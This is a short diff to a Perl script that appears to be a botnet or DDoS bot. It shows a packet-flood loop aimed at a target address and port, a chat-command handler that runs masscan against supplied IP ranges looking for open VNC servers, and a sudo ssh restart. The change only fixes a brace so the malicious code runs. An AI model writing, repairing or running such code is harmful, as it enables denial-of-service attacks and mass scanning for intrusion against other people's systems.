@@ -133,8 +133,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
               send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
               usleep(1000 * $delay) if $delay;
             }
-    
-    elsif ($msg =~ /@.scan ([^\s]+)/) {
+    } elsif ($msg =~ /@.scan ([^\s]+)/) {
      $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
      my $range = $1;
      my $masscancmd = "masscan -p 5900 --range $range --rate 25000 --open --banners -oG hosts.txt ";
